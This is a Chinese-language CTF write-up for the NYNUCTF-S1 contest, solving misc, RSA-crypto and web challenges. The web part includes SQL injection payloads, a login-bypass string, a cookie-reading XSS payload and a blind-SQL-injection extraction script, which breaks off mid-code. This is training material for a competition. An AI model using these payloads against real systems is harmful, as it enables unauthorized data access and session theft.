# NYNUCTF-S1
## Misc
### **签到-SignIN**

拿到题目打开是一个被分割的二维码，用画图或ps工具，还原即可

![1.png](https://i.loli.net/2020/11/08/Cp6OJIr1Fm8VQk9.png)

得到flag: `nyctf{W3lC0me_tO_nyctf2020}`

### 送分题

题目下载下来打开是一个文本，和一个加密压缩包，文本里面是一串base64，这个应该都知道，可能会卡在第二步base64解出来是一串酷似16进制的字符，但是它是MD5：https://www.somd5.com

![1.png](https://i.loli.net/2020/11/08/n6YVERTDxfdjFuO.png)

解出来是interesting，是压缩包的密码打开压缩包是一段佛门语言，看不懂，但是有专门的解密网站：与佛论禅（http://www.keyfc.net/bbs/tools/tudoucode.aspx）

![2.png](https://i.loli.net/2020/11/08/hBCXvgp5sLROuoq.png)

解密的时候要在你想解密的东西上加上 `佛曰：***`这种格式

解出flag：`nyctf{ctf_zhen_bu_chuo}`

### Baby_misc

把题目下载下来打开压缩包，发现有一张图片和一个加密的压缩包，打开图片查看

![1.png](https://i.loli.net/2020/11/08/iGkdloBSg4qIs9F.png)

根据图片名字提示pig（猪），可以猜测跟猪有关，那可能是猪圈密码，去网上搜索猪圈密码对照表，解出图片信息：doyouknowiloveyou 这是加密压缩包的密码，然后打开压缩包发现是一张图片，看图片名字 害（high），又是 png 后缀的图片，可以猜测是高度问题，放入010或者winhex，修改高度（插播一个小知识点，下面标记的两个框框，左边为图片的宽，右边为图片的高，而且一般修改的话，修改代表宽高的后面两个就可以了）这边已经修改了，因为不需要准确的高所以就随便改的高了一点

![2.png](https://i.loli.net/2020/11/08/ltjIgTPvCdwyDUa.png)

修改高度之后的图片：

<img src="https://i.loli.net/2020/11/08/opDj1zwsehQWycT.png" alt="3.png" style="zoom:50%;" />

因为提交格式是`nyctf{****}`，显然这不符合，所以可能会猜测是栅栏或者凯撒密码，都不对，这里应该是这一题的难点， 维吉尼亚密码，凯撒密码的加强版，但是解维吉尼亚密码需要密钥，题目描述上有提示学校的简称 nynu，所以解出flag：`nyctf{n1_shi_2hen_Deg0u}`

维吉尼亚密码（https://www.qqxiuzi.cn/bianma/weijiniyamima.php）

### dogeKing：rua!

首先，下载题目附件，得到多吉国王美照一张：
![dogeKing：rua!.jpg](https://i.loli.net/2020/11/08/1axEcC56Bo4ZAiV.jpg)

如果有安装Bandizip的话，右键这个文件可以发现文件尾部还藏了一个压缩包。
![rightclick.png](https://i.loli.net/2020/11/08/petSoqrajwTZbCX.png)

如果没安装的话，那就拖入010editor看看呗，010也给出了文件尾存在未知数据的提示，这数据以PK开头，那基本上就可以判断是zip文件了。
![010editor.png](https://i.loli.net/2020/11/08/EUtKsWCrGhq6oFv.png)

把后面的数据另外提到一个文件，就可以用压缩软件打开了。
然后无论通过哪种方式打开了压缩文件，都会发现压缩包是加密的。
![zip.png](https://i.loli.net/2020/11/08/chUatliAqSxfyjT.png)

若尝试了伪加密、爆破，会发现一无所获。
这时候就需要观察特征了，压缩包里的文件都极小，仅3字节，那这不就是经典的crc32碰撞吗？
于是拿出碰撞脚本或者工具，即可跑出文件内容。
```python
import time
import zlib

def fuc1(str, times, len, pswdall, crcall): # 所有位置的可能字符一样
    times += 1
    for i in pswdall:
        if times == len:
            #print(str + i)
            crc = zlib.crc32((str + i).encode())
            if crc in crcall:
                print(hex(crc)[2:], str + i)
                #print(time.asctime())
        else:
            fuc1(str+i, times, len, pswdall, crcall)

def fuc2(str, times, len, pswdall, crcall): # 不同位置的可能字符不一样
    times += 1
    for i in pswdall[times-1]:
        if times == len:
            #print(str + i)
            crc = zlib.crc32((str + i).encode())
            if crc in crcall:
                print(hex(crc)[2:], str + i)
                #print(time.asctime())
        else:
            fuc2(str+i, times, len, pswdall, crcall)

print(time.asctime())
fuc1("",0,3,r" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~",{0x974ecd65,0x58c97d0b,0x7c6287fd,0xf370f851,0x147f6067})
print(time.asctime())
```
脚本结果如下：
![image.png](https://i.loli.net/2020/11/08/nYb32GqojNc8FfM.png)

工具命令为：`hashcat -m 11500 -a 3 hash.txt ?a?a?a?a?a -i --increment-min 3 --increment-max 3 --outfile-autohex-disable --keep-guessing`，其中`hash.txt`为存储需要碰撞的crc32的文本文件。
工具（hashcat）结果如下：
![image.png](https://i.loli.net/2020/11/08/WAsDVYE1T3a2crq.png)

最终都能得到如下文本：
```
f370f851 ,ru
147f6067 a!}
7c6287fd crc
974ecd65 nyc
58c97d0b tf{
```

根据压缩包中文件名的可读性顺序（nyctf），重新排列其对于的crc32和明文，即可得到如下文本：
```
974ecd65 nyc
58c97d0b tf{
7c6287fd crc
f370f851 ,ru
147f6067 a!}
```

所以flag为`nyctf{crc,rua!}`

### **欢迎进入misc大门**

打开压缩包看见一个不知道是什么的文件，拖入winhex看一下
![m1.png](https://i.loli.net/2020/11/09/2J6L5oiUlGcNxZY.png)

看文件头看不出来什么东西，翻到最后看文件尾部E4 50 98 这样很像是png格式的图片的文件头，这时候就想到把字符串倒置一下，看一下
![m2.png](https://i.loli.net/2020/11/09/HavcLxRrUMp3gOs.png)

这边用的是CTFTools的字符反转功能
![m3.png](https://i.loli.net/2020/11/09/G15FebICB6HA8fy.png)

将字符串倒置的字符串放到winhex里可以看出已经有PNG的雏形了。
![m4.png](https://i.loli.net/2020/11/09/F73BpguYH8sEq4T.png) 

但是png文件头是89504E 这边给他改一下。得到一张PNG图片。
![m5.png](https://i.loli.net/2020/11/09/QbLiK2gcNeD3UCR.png)

将这个图片分离一下得到一个压缩包，压缩包有密码，尝试一下图片中的ILIKENYNU,成功进入，压缩包里有个压缩包和一个图片。将图片拖入winhex里看到，文件尾部有一串莫斯密码
![m6.png](https://i.loli.net/2020/11/09/dc7vispNZDQ1wVY.png)

揭秘一下得到一串英文。打开压缩包看到注释上写着密码共13位，后6位为数字。我们已经得到了一串英文，这样想到了掩码攻击
![m7.png](https://i.loli.net/2020/11/09/8DLCnqNJfpWH5xb.png)

得到了密码。LOVEBOY521521

进入下一层打开文本看出来一串字符，一看就是OOK编码，去相应的网站进行解密https://www.splitbrain.org/services/ook
![m8.png](https://i.loli.net/2020/11/09/5PAyBo47Lb2Dwml.png)得到一半。

另一个图片右击图片属性打开看到另一半
![m9.png](https://i.loli.net/2020/11/09/tij6s79xVeLq8aT.png)

得到密码`SunZHipenGZuiShuaI`

进入最后的文档后看到几段话
![m10.png](https://i.loli.net/2020/11/09/X5fOJ8FyArlKdTM.png)

一看就是两个密码合到一起的。一个是Brainfuck编码 一个是核心注意价值观编码，两个编码的解密网站分别是
https://www.splitbrain.org/services/ook
http://ctf.ssleye.com/cvencode.html

解密以后得到flag：`nyctf{w1c0mE_NYNU}`

### 套娃之家

![2.png](https://i.loli.net/2020/11/08/oKWBLIUzMbdl5ZH.png)

**1>**首先分析密文，3uLVoIeIT+NC4OPjQQFm1jIkivbvfhX7ELBddQ3wDEZWxmApgvoYf3qLKjzc5DMB

根据编码特征和做题经验，可以猜测出是AES或者DES加密，出题时采用了DES加密，而这种加解密需要一个密钥

![3.png](https://i.loli.net/2020/11/08/XLWE7nQpPZOuFbf.png)

密钥就在图上，细心的同学应该可以看到，隐藏于文字间

DES解密网站：http://tool.chacuo.net/cryptdes

解密出来得到一个网盘链接

![4.png](https://i.loli.net/2020/11/08/TNtMjspLaSv9PRU.png)

 访问无果，需要提取码

**2>**题目附件给了个音频，该音频改编于SCTF2020 Misc系列-Can you hear（攻防世界有今年的赛题）

使用手机软件Robot36 app即可进行识别出 提取码（需要安静环境，播放音频)

或者使用电脑版MMSSTV识别（手机软件识别更好一点）

该小关也给了提示 音频是来自空间站传来的信息，百度可以查到下面这篇文章学习

![6.png](https://i.loli.net/2020/11/08/XWQhCqaUNPYRDus.png)

手机软件识别结果如下：

![6.png](https://i.loli.net/2020/11/08/Y4CHRPXMxw3frSa.png)

**3>**结合网盘链接和提取码（2jrl） 提取文件 bp.zip

![7.png](https://i.loli.net/2020/11/08/5VP1hfv9YpeabyU.png)

根据提示bp是爆破的缩写

使用zip爆破工具ARCHPR 爆破出压缩包密码：98934

![8.png](https://i.loli.net/2020/11/08/47mdDcuPGpb6Jhv.png)

**4>**打开后，又是一个网盘

![9.png](https://i.loli.net/2020/11/08/OM8sdmZ6fVlUFX1.png)

 下载后，仿佛离答案更近了一步，未知类型 fl@g.crypto

这里用到了一款文件加解密的软件，以 .crypto文件为结尾的软件 —— Encrypto

```
软件介绍：Encrypto 使用了大名鼎鼎的高强度 AES-256 加密算法，这是目前密码学上最流行的算法之一，广泛应用在军事领域，文件被破解的可能性几乎为零，安全性极高。像 1Password、KeePass、LastPass 之类的密码应用以及开源的加密软件 VeraCrypt 也同样是采用 AES256 算法的。
　　跨平台支持 Windows 与 Mac
　　通过 Encrypto 加密后的文件或者文件夹会变成一个以 .crypto 为后缀的单文件。当然，解密也相当的简单，无论是 Win 或 Mac 版的 Encrypto 都能轻松加密任何 .crypto 文件，只要输入正确密码后，你的文件就会被立即还原。
```

软件下载链接 https://encrypto.en.softonic.com/   

​					    https://macpaw.com/encrypto  

​					    http://www.greenxiazai.com/soft/136689.html

**5>**下载安装后，需要文件解密的密钥，它在哪里呢？

根据提示，回头看

![10.png](https://i.loli.net/2020/11/08/AZ6t419auDjJiy5.png)

注释里含有 Tab隐秘术和空白格隐写

将文本复制到.txt文本中，将一个空格全部替换成0，将一个tab键全部替换成1，二进制转ascii码

https://www.binaryhexconverter.com/binary-to-ascii-text-converter

![11.png](https://i.loli.net/2020/11/08/EO85GlpDnc2YQAw.png)

即可得到文件加密时的密钥：SeCret

![12.png](https://i.loli.net/2020/11/08/MudlJfi1ngTpvEr.png)



需要手输入进去

![image.png](https://i.loli.net/2020/11/08/ROH2LMVQTFfEX8w.png)

得到flag:  `nyctf{Congratulations!!!~you^got~it}`

## Crypto

### easyRSA
打开题目附件，得到如下两个文本文件：
```python
import gmpy2
from Crypto.Util.number import *

flag = 'nyctf{****************************}'

m = int(flag.encode('hex'), 16)
p = getPrime(414)
q = getPrime(414)
e = 3
n = p * q
phi_n = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi_n)
c = pow(m, e, n)
msg = "n = " + str(n) +"\nc = " + str(hex(c)[2:])

m = int(msg.encode('hex'), 16)
p = getPrime(2048)
q = getPrime(2048)
e = 32767
n = p * q
phi_n = (p - 1) * (q - 1)
d = gmpy2.invert(e, phi_n)
c = pow(m, e, n)
msg = "p = " + str(p) + "\nq = " + str(q) + "\nn = " + str(n) + "\nc = " + str(hex(c)[2:])
print msg
```
```
p = 18981629137627874553898043045447661550553390111951006953273965593361950811850356555764853397986125684740113638988087731994954737741224678895892738504198394591238110492582096657049466879517026028223012498737184571052883068961521204678757595500898962351742135914186864152900868912703777161760415473776127582862675351707436584249476729420145654992993442816305743535465027468677554291992235294533706384895370482689978644936319824239196465475750633752457064318316963460796565172513172491759226087923820116742280019516875295039279271595564283178324119862989455888551529672334385577051886021344994798593180718188947292769371
q = 31705855941685530544434560879189522374145994554069582851256756041735976657536726666172277172721295992540295282051821662121270129786826335963127809120628481672473001186997512557614789845818240955432395272599340599808153470312204604015399239849673208013648589785890629204874508093437086622327469644234344419889974892458396851504038780008617932645582097194866167688529593984144800824631717575051824478174171643590920321521822343553715476304124810883003176460729218778886703050224196252473703045812274513691553497708730354710433393216239621439399105148377978307026312521523655733794016083213314575062525619871622382430947
n = 601828798976129939628883953959774980307017316322671940799072841567740145265680595265356927618412823380103067254924651854151101058224045180329151964824617088602642408524960240231652307177841204509234781857002644275204027712855415100976922093377043497875179898504741093474111343290361145774011679373860362495259746135944024061789815433472403108952057820507065202176579089691929297306350069440457190935571735100975623027508167368318049785656905876831319046310826950870990776214137292075925465031370660814069565087970803994763362560112241794106456017431300177538699088926483520840901944779388658159554702512457444200247359612359620688154146199232300467555327448853075420025901275628365742785116132978093638737383467961178587972354574379890624623215520117599063239638785962915417866421909503253362243014306988655742291035322446932511350853741087792697938214013453625598381071880483467364505830475926709360785946682395554244039935926206904387685681229710361782560727869655729210411233564047132829130267246410915563006044057327085426632132735530040519455630874157092161868713209294967745836335044902317977446420440001020373321743339649990157798734680760887961470296802011851391697691376370202175628534199880336334760562373111796638804124337
c = 277b30e4c9752642240aad209c94cd08d4a2c3112e4acf1a3880c824ed6aec39bc8868d1ab6cc138e3a26724733100e2460583b97930d02207c55c9d1f704ff7ad5f37f571c23cd5a914ff08ef451cc18732cfd4a425317e266a69ebb25a0bcfd68440562f549b111b5a87d561070bd3367daf2fdf4cd36bcb39602dd0a14d4d345040c7c6fe284af94122dff1f93076d89e1313e67b258211533a7884054d04bae750bb120f5e4d0755d9af229098baaf192df86aaaa4ca74a00d773a3744edbd36cc4eaf2eaff3ecdbac3956731465de01dbac0d4b2deb5474aa395c1776dc52eef570ac3a5828f04ff1fecdf6fb2009f5232ba00c866a5a371c0c562381956f0c242661aacac7d946ef205bbaedd849e8783dd679e773088eaae7874a5656dbe1d2c2e207a1801f41f32c0c1440e4f875a0b2b6133a8173b6017d4b1726f8cea7876c514a399a36968dac2ab9753ea356b2a6054786910f99f3fd30b6122c1bf4bac3266e3ad87c1fdc4c4bd9a0fc774a8ca8088ffc6a713ce7232b8019c8393e9df61a95d1b317ec9710280074202b072665e6b64364aa21300296837437047a09effe15c009e2f155b2e0023c55a6e91f3f8d819607bca51095d54531e36cea270897b9309ce9b9d44c5012a645a08fa77a237e8809486d817b06fce9656277beb66403d184b04e6fcfd824fb3cadc2e12c6b6db29d9513ec4c3d1c4a54L
```
分析给出的python脚本，由其中的关键性语句`c = pow(m, e, n)`可知这是RSA加密脚本，那么我们自然需要写出对应的解密脚本。
那么咱就需要把步骤倒过来，脚本中最后是一个e=32767的一次RSA 2048加密，并且p,q,c已知，出题人很好心的把n也给出来了，那么直接按标准RSA解密脚本写之：
```python
import gmpy2
from Crypto.Util.number import *

c = 0x277b30e4c9752642240aad209c94cd08d4a2c3112e4acf1a3880c824ed6aec39bc8868d1ab6cc138e3a26724733100e2460583b97930d02207c55c9d1f704ff7ad5f37f571c23cd5a914ff08ef451cc18732cfd4a425317e266a69ebb25a0bcfd68440562f549b111b5a87d561070bd3367daf2fdf4cd36bcb39602dd0a14d4d345040c7c6fe284af94122dff1f93076d89e1313e67b258211533a7884054d04bae750bb120f5e4d0755d9af229098baaf192df86aaaa4ca74a00d773a3744edbd36cc4eaf2eaff3ecdbac3956731465de01dbac0d4b2deb5474aa395c1776dc52eef570ac3a5828f04ff1fecdf6fb2009f5232ba00c866a5a371c0c562381956f0c242661aacac7d946ef205bbaedd849e8783dd679e773088eaae7874a5656dbe1d2c2e207a1801f41f32c0c1440e4f875a0b2b6133a8173b6017d4b1726f8cea7876c514a399a36968dac2ab9753ea356b2a6054786910f99f3fd30b6122c1bf4bac3266e3ad87c1fdc4c4bd9a0fc774a8ca8088ffc6a713ce7232b8019c8393e9df61a95d1b317ec9710280074202b072665e6b64364aa21300296837437047a09effe15c009e2f155b2e0023c55a6e91f3f8d819607bca51095d54531e36cea270897b9309ce9b9d44c5012a645a08fa77a237e8809486d817b06fce9656277beb66403d184b04e6fcfd824fb3cadc2e12c6b6db29d9513ec4c3d1c4a54L
n = 601828798976129939628883953959774980307017316322671940799072841567740145265680595265356927618412823380103067254924651854151101058224045180329151964824617088602642408524960240231652307177841204509234781857002644275204027712855415100976922093377043497875179898504741093474111343290361145774011679373860362495259746135944024061789815433472403108952057820507065202176579089691929297306350069440457190935571735100975623027508167368318049785656905876831319046310826950870990776214137292075925465031370660814069565087970803994763362560112241794106456017431300177538699088926483520840901944779388658159554702512457444200247359612359620688154146199232300467555327448853075420025901275628365742785116132978093638737383467961178587972354574379890624623215520117599063239638785962915417866421909503253362243014306988655742291035322446932511350853741087792697938214013453625598381071880483467364505830475926709360785946682395554244039935926206904387685681229710361782560727869655729210411233564047132829130267246410915563006044057327085426632132735530040519455630874157092161868713209294967745836335044902317977446420440001020373321743339649990157798734680760887961470296802011851391697691376370202175628534199880336334760562373111796638804124337
e = 32767
q = 31705855941685530544434560879189522374145994554069582851256756041735976657536726666172277172721295992540295282051821662121270129786826335963127809120628481672473001186997512557614789845818240955432395272599340599808153470312204604015399239849673208013648589785890629204874508093437086622327469644234344419889974892458396851504038780008617932645582097194866167688529593984144800824631717575051824478174171643590920321521822343553715476304124810883003176460729218778886703050224196252473703045812274513691553497708730354710433393216239621439399105148377978307026312521523655733794016083213314575062525619871622382430947
p = 18981629137627874553898043045447661550553390111951006953273965593361950811850356555764853397986125684740113638988087731994954737741224678895892738504198394591238110492582096657049466879517026028223012498737184571052883068961521204678757595500898962351742135914186864152900868912703777161760415473776127582862675351707436584249476729420145654992993442816305743535465027468677554291992235294533706384895370482689978644936319824239196465475750633752457064318316963460796565172513172491759226087923820116742280019516875295039279271595564283178324119862989455888551529672334385577051886021344994798593180718188947292769371

d = gmpy2.invert(e, (p - 1) * (q - 1))
m = pow(c, d, n)
print long_to_bytes(m)
```
输出如下：
```
n = 688195263328618104471298179256468302796230553029714339661155078250969255791783493032484059522158335626967202968516322360829573222989575263843106708166014165985267991895634283673982111149111744348255242103994505756291384012261616187676097593951773377
c = e38f34118ec1252213e96bc1bfa80d88091b0f0be080a0b6e8f084d6200cf894698b435e5724111d6a26ab615ec8a1143d6be7f9e7047b6aa7b2a668f2c6b79af4a04ef80cd5cf88388c2dfefa08a4b038a874eeb97e88aad5ae6fcb7d1fdec2d799ca3796130dL
```
这也就是加密脚本中第二段加密是用的明文msg。
然后接着准备写第一段加密的解密脚本，观察发现，只给出了n和c，无法通过标准RSA解密方法进行解密，那么就需要寻找合适的攻击方法，这里发现加密脚本中`e=3`，那么可以采用小明文攻击的方式尝试攻击。脚本如下：
```python
import gmpy2
import time
from Crypto.Util.number import long_to_bytes

n=688195263328618104471298179256468302796230553029714339661155078250969255791783493032484059522158335626967202968516322360829573222989575263843106708166014165985267991895634283673982111149111744348255242103994505756291384012261616187676097593951773377
e=3
res=0
c=0xe38f34118ec1252213e96bc1bfa80d88091b0f0be080a0b6e8f084d6200cf894698b435e5724111d6a26ab615ec8a1143d6be7f9e7047b6aa7b2a668f2c6b79af4a04ef80cd5cf88388c2dfefa08a4b038a874eeb97e88aad5ae6fcb7d1fdec2d799ca3796130dL
print time.asctime()
for k in xrange(200000000):
    if gmpy2.iroot(c+n*k,3)[1]==1:
        res=gmpy2.iroot(c+n*k,3)[0]
        # print k,res
        print long_to_bytes(res)
        print time.asctime()
        break
```
运行后结果如下：
```
Sun Nov  8 18:06:26 2020
nyctf{w31c0me_2_NYCTF_Crypto, bro!}
Sun Nov  8 18:06:26 2020
```
可以发现攻击方法有效，成功拿去第一段加密的明文，也就是flag`nyctf{w31c0me_2_NYCTF_Crypto, bro!}`。

## Web
### 真·签到

这 真·签到 是真的签到看着页面花里胡哨的但是是最简单的，比拼图还简单，直接f12

![9XDHSKT290__EQLBA__COBJ.png](https://i.loli.net/2020/11/08/zsi9K3VIEOoSXme.png)

### catchCat

打开题目给的链接，可以打开如下网页：
![image.png](https://i.loli.net/2020/11/08/VMoH4JgEuReYSqc.png)

#### 解法1
查看网页html源码如下：
```html
<html>
 <head>
  <title>喵喵喵？</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 </head>
 <body>
  <div align="center">
   <script src="phaser.min.js"></script>
   <script src="catchCat.js"></script>
   <div id="catchCat"></div>
   <script>
	window.game = new CatchTheCatGame({
		w: 11,
		h: 11,
		r: 20,
		backgroundColor: "#fff",
		parent: "catchCat",
		statusBarAlign: "center",
		credit: "NYNUCTF"
	})
   </script>
  </div>
 </body>
</html>
```
发现引用了两个js脚本，直接取两个js脚本中寻找flag关键字`nyctf`，在`catchCat.js`中找到了flag。
![image.png](https://i.loli.net/2020/11/08/zEyfKRB6ogQUV9l.png)

#### 解法2
Google一下这个游戏的一些关键词，运气好可以找到一个分析这游戏的帖子：[教你巧妙过关吾爱沙雕游戏《圈小猫》 - 『编程语言区』  - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn](https://www.52pojie.cn/thread-1143056-1-1.html "教你巧妙过关吾爱沙雕游戏《圈小猫》 - 『编程语言区』  - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn")，根据帖子给出的脚本：
```javascript
window.game.solver = function (blocksIsWall, i, j) {
    return -1;
};
```
在浏览器控制台中执行后，尝试开始游戏，即可得到flag。
![image.png](https://i.loli.net/2020/11/08/jUoeXv2u31dPHGK.png)

#### 解法3
老老实实玩游戏，也能看运气通关。

---

解法1才是正确解法，所以解法2和解法3都需要一定的运气。
flag为`nyctf{itIsSoEasyToCatchTheCat}`。

### baby_sql

首先在源码注释地方知道要传递参数id

![bq1.png](https://i.loli.net/2020/11/09/YCt7HOpg1ZULw4W.png)

如果耍过sqllib的同学应该很熟悉  那个sql注入靶场就是传递id参数

常规的sql注入

发现传入 union和select后会出现 get out，hack

被过滤了，使用双写绕过  uniounionn  selecselectt

这里为什么可以双写饶过呢？

![bq2.png](https://i.loli.net/2020/11/09/OjCdXVe7ntZzYbG.png)

这里放出题目源码，过滤是把union和select给替换成空了

如果我们输入  uniounionn 这个有unio+union+n组成 替换只进行了一次，将中间的union替换成空的时候 它前边和后边就组合成了新的union。Select也是同理。

所以就正常的sql注入流程就可以

这里还有一点 就是hint1提示的 #传不进去 可以用%23或者--+替代

查字段

`?id=1’ order by 3--+`

查看回显位置

`?id=1' uniounionn seleselectct 1,2,3--+`

![bq3.png](https://i.loli.net/2020/11/09/aEOnql9FXzBhi7V.png)

回显位置是2,3

查询数据库

`?id=1' uniounionn seleselectct 1,2,database()--+`

得到数据库名ctf

爆ctf库中得到数据表

`?id=1%27%20uniounionn%20seleselectct%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27ctf%27%20--+`

得到flag,users

爆字段

`?id=1%27%20uniounionn%20seleselectct%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flag%27%20--+`

得到id flag value

查询vlaue字段

`?id=1%27%20and%201=1%20ununionion%20selselectect%201,2,value%20from%20flag--+`

![bq4.png](https://i.loli.net/2020/11/09/dpcTinWOeJvzXA7.png)

### 请登录

题目提示让登陆

不知道密码的情况下

1. 弱密码
2. 万能密码

尝试若账号密码爆破不出来

然后万能密码

`账号：123’ or 1=1#`

`密码：随意`

 万能密码原理：

看一下题目源码中sql语句的拼接

```sql
$sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
```

直接讲username和password拼接到sql语句中

如果输入的账号密码查询到有结果 那么就返回为真 如果查询不到这个账号密码就返回为假就登录失败

将我们的payload带进去sql语句看一下

```sql
`$sql="SELECT*FROM users WHERE username='123’ or 1=1#' and password='$password'";`
```

密码随意

可以看到 123后边的单引号讲sql中的username的单引号闭合了。然后 or 1=1 #

1=1肯定为真  or 或  只要有一个为真整个语句就为真，#号是注释  #号后边的东西都被注释掉了

那么username=‘123’ or 1=1 #  不管数据库中是否有这个123用户  因为1=1的原因这条语句都为真 所以就查询成功  也就登录了

### Xss2FindCookie

本题来自SUSCTF2018	基本未作修改

用到的是Markdown的一个XSS漏洞，读出cookie就能得到flag

过滤了<script>标签

- step 1 输入框输入

```javascript
<input onfocus="document.write(document.cookie)" autofocus>
```

- step 2 点击即可在图片中获得flag

![xss.png](https://i.loli.net/2020/11/08/LEwIrJYX4tz3jbl.png)

### easySql

这道题考查sql盲注

使用`?username=123&password=123`

登录失败

然后使用

`?username=123&password=123%27%20or%201=1--+`

和之前的万能密码登录的一样  这样显示登录成功

 应该可以确定是盲注  只有两种返回结果 如果sql语句执行成功就显示登录成功，执行失败就显示登录失败。

那么我们构造sql语句来遍历出数据库名字  数据库表名 和flag

 我写了一个 不太自动的python脚本  原本是想写一个 自动跑出所有表名和数据呢，但是后边数据处理有点麻烦 就没写成

```python
import requests

key="Login successful"

# 数据库名长度

def len_data(url):

  for i in range(16):

​    payload=url+"%20or%20(length(database()))="+str(i)+"--+"

​    print(payload)

​    report = requests.get(payload, timeout=50)

​    if key in report.text:

​      print("数据库名称长度为：",end='')

​      len_dataname=i

​      print(i)

​      break

  return i

# 数据库名

def data_name(url,length):

  akn=''

  for i in range(1,length+1):

​    for n in range(64,127):

​      payload=url+"%20or%20(ascii(substr(database(),"+str(i)+",1)))="+str(n)+"--+"

​      print(payload)

​      report = requests.get(payload)

​      if key in report.text:

​        name=n

​        print(chr(name))

​        break

​    akn+=chr(name)

​    print("数据库名称为：",end='')

​    print(akn)

  return akn

 

# 数据库中表的个数

def num_table(url,dataName):

  for i in range(16):

​    payload=url+" or ((select count(table_name) from information_schema.tables where table_schema = '"+dataName+"') ="+str(i)+")--+"

​    print(payload)

​    # ?username=admin&&password=123' or ((select count(table_name) from information_schema.tables where table_schema = 'ctf') = 2)--+

​    re=requests.get(payload)

​    if key in re.text:

​      numTable=i

​      print("数据库中表的个数："+str(i))

​      break

  return i

 

# 爆表名长度

# 1' and (select length((select table_name from information_schema.tables where table_schema = 'security' limit 0,1)) = 10)--+

def lenTable(url,numTable,dataName):

  for i in range(30):

​    payload=url+" or (select length((select table_name from information_schema.tables where table_schema = '"+dataName+"' limit "+str(numTable)+",1)) = "+str(i)+")--+"

​    print(payload)

​    re=requests.get(payload)

​    if key in re.text:

​      print("第"+str(numTable+1)+"个表名长度为："+str(i))

​      break

  return str(i)

 

 

# 爆表名

def tableName(url,numTable,lenTable,dataName):

  # 爆表名：

  # 1' and (select mid((select table_name from information_schema.tables where table_schema = 'security' limit 0,1),1,1)='a')--+

  value="qwertyuiopasdfghjklzxcvbnm_*/-!.@#$%^&*()0123456789"

  tableName=""

  for k in range(int(lenTable)):

​    for i in value:

​      payload=url+" or (select mid((select table_name from information_schema.tables where table_schema = '"+dataName+"' limit "+str(numTable)+",1),"+str(k+1)+",1)='"+i+"')--+"

​      print(payload)

​      re=requests.get(payload)

​      if key in re.text:

​        name=i

​        print(name)

​        tableName += name

​        break

​    print("第"+str(numTable+1)+"个表的名称为"+tableName)

  return tableName

# 表中有几列

# 1' and ((select count(column_name) from information_schema.columns where table_name = 'users' and table_schema = 'security') = 3)--+

def numClumn(url,tableName,dataName):

  for i in range(20):

​    payload=url+" or ((select count(column_name) from information_schema.columns where table_name = '"+tableName+"' and table_schema = '"+dataName+"') = "+str(i)+")--+"

​    re=requests.get(payload)

​    if key in re.text:

​      print(tableName+"中有"+str(i)+"列")

​      break

  return i

 

 

# 测列名长度：

# 1' and (select length((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 1,1)) = 8)--+

def lenClumn(url,tableName,dataName,numClumn):

  lenList=[]

  for k in range(numClumn):

​    for i in range(20):

​      payload=url+" or (select length((select column_name from information_schema.columns where table_name = '"+tableName+"' and table_schema = '"+dataName+"' limit "+str(k)+",1)) = "+str(i)+")--+"

​      print(payload)

​      re=requests.get(payload)

​      if key in re.text:

​         print(tableName+"中第"+str(k+1)+"个列名长度为："+str(i))

​        lenList.append(i)

​        break

  return lenList

 

 

# 爆列名:

# 1' and (select mid((select column_name from information_schema.columns where table_name = 'users' and table_schema = 'security' limit 1,1),1,1)='u')--+

def clumnName(url,tablename,dataname,numclumn1,lenclumn):

  st="qwertyuiopasdfghjklzxcvbnm/*-+=-)(*&^%$#@!1234567890."

  print(numclumn,end='')

  numClumn=int(numclumn1)

  print(lenclumn)

  clumnname=[]

 

  for i in range(numClumn):

​    name = ""

​    for k in range(lenclumn[i]):

​      for n in st:

​        payload=url+" or (select mid((select column_name from information_schema.columns where table_name = '"+tablename+"' and table_schema = '"+dataname+"' limit "+str(i)+",1),"+str(k+1)+",1)='"+n+"')--+"

​        print(payload)

​        re=requests.get(payload)

​        if key in re.text:

​          print(n)

​          name+=n

​           print(name)

​          break

​    clumnname.append(name)

  return clumnname

 

# #爆数据

# #1' and (select mid((select username from security.users limit 0,1),1,1)='d')--+

# def content(url,daName,taName,cName):

#   list=[]

#   st="zxcvbnm,./';lkjfdsaqwertyuiop[]=0987654321*-_)(*&^%$#@!{}"

#

#   for cname in cName:

#       name = ''

#       for k in range(20):

#         for s in st:

#           payload=url+" or (select mid((select "+cname+" from "+daName+"."+taName+" limit 0,1),"+str(k+1)+",1)='"+s+"')--+"

#           print(payload)

#           re=requests.get(payload)

#           if key in re.text:

#             name+=s

#             print(name)

#             break

#       list.append(name)

#

#   return list

# def flag(url,dataName,tabaName):

#   st="zxcvbnmm,./';lkjhgfdsaqwertyuiop[]1234567890./*-++_)(*&^%$#@!{}"

#   name=''

#   for i in range(40):

#     for s in st:

#       payload=url+" or (select mid((select "+value+" from "+dataName+"."+tabaName+" limit 0,1),"+str(i+1)+",1)='"+s+"')--+"

#       re=requests.get(payload)

#       print(payload)

#       if key in re.text:

#         name+=s

#         print(name)

#   return name


if __name__ == '__main__':

  url="http://47.93.123.227:5000/?username=123&password=123'"

  lenDataname=len_data(url)

  dataName=data_name(url,lenDataname)

  numTable=num_table(url,dataName)

  lenTableList=[]

  for i in range(numTable):

​    print(i)

​    num=lenTable(url,i,dataName)

​    lenTableList.append(num)

  tableNameList=[]

 

  for k,i in zip(range(numTable),lenTableList):

​    tablename=tableName(url,k,i,dataName)

​     tableNameList.append(tablename)

 

  numClumnDict = {}

  for i in tableNameList:

​    num=numClumn(url,i,dataName)

​    numClumnDict[i]=num

  print(numClumnDict)

 

  lenClumnList=[]

  lenClumnDict={}

  for tablename,numclumn in zip(numClumnDict.keys(),numClumnDict.values()):

​    lenClumnList=lenClumn(url,tablename,dataName,numclumn)

​    lenClumnDict[tablename]=lenClumnList

​    print(lenClumnDict)

 

  ClumnName=[]

  ClumnNameDict={}

  for tname in tableNameList:

